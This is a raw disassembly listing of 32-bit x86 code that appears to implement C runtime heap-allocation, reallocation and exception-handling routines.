  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
